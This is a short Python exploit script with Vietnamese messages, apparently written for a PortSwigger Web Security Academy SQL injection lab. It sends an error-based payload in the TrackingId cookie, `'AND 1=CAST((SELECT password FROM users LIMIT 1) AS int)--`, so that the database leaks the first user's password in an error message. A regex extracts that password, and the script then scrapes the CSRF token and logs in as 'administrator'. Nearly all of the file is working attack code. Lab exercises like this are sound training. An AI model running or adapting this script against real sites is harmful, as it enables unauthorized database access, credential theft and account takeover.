import requests
import re
from bs4 import BeautifulSoup

def get_password_from_sqli(url, session_cookie):
    print("[*] Đang khai thác SQLi để lấy mật khẩu...")
    payload = "'AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
    cookies = {
        "TrackingId": payload,
        "session": session_cookie
    }

    try:
        response = requests.get(url, cookies=cookies)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"[!] Lỗi khi gửi request: {e}")
        return None

    match = re.search(r'integer: "(.{20})"', response.text)
    if match:
        print("[+] Tìm thấy mật khẩu:", match.group(1))
        return match.group(1)
    else:
        print("[-] Không tìm thấy mật khẩu trong phản hồi.")
        return None

def login_as_admin(url, password):
    login_url = f"{url}/login"
    session = requests.Session()

    try:
        response = session.get(login_url)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"[!] Không thể truy cập trang login: {e}")
        return False

    soup = BeautifulSoup(response.text, "html.parser")
    csrf_input = soup.find("input", {"name": "csrf"})
    if not csrf_input or not csrf_input.get("value"):
        print("[-] Không tìm thấy CSRF token.")
        return False

    csrf_token = csrf_input["value"]
    data = {
        "csrf": csrf_token,
        "username": "administrator",
        "password": password
    }

    response = session.post(login_url, data=data)
    if "Log out" in response.text or response.url != login_url:
        print("[+] Đăng nhập thành công!")
        return True
    else:
        print("[-] Đăng nhập thất bại.")
        return False

if __name__ == "__main__":
    print("Nhập URL (ví dụ: https://xxxxx.web-security-academy.net/):")
    url = input(">> ").rstrip("/")
    session_cookie = input("Nhập session cookie (nếu có): ").strip()

    password = get_password_from_sqli(url, session_cookie)
    if password:
        login_as_admin(url, password)
